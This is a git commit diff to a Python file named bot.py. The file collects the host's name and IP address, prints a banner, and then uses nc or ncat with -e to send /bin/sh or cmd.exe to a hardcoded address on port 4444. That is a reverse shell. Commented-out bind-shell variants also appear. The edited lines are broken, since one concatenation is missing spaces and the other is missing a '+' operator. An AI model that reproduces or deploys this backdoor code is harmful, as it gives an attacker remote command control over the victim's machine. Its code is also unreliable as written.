7d1dfcc833ebb32c1d407e0b4e74c868add77cf4
Pol420OWO <118475266+Pol420OWO@users.noreply.github.com>
2023-02-14 20:05:50 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -6,6 +6,7 @@ def run():
     hostname=socket.gethostname()   
     IPAddr=socket.gethostbyname(hostname) 
     iph='172.16.22.82'
+    lport='4444'
     print('')
     print(' ############### # # # ##############')
     print(' ####### ###### # #  # # ####### ####')
@@ -18,9 +19,9 @@ def run():
         print('Linux: ', sysconfig.get_platform()) 
         print(' IpAddress: ', IPAddr)
         #os.system( 'nc -lvp 4444 -e /bin/sh')
-        os.system('nc' + iph+ ' 734 -e /bin/sh')
+        os.system('nc' + iph+ lport + ' -e /bin/sh')
     elif "Windows" in platform.system():
         print('Windows: ', sysconfig.get_platform()) 
         print('Address ip: ', IPAddr)
         #os.system('ncat -lvp 4444 -e cmd.exe')
-        os.system('ncat '+ iph +' 4444 -e cmd.exe')
+        os.system('ncat '+ iph + lport ' -e cmd.exe')
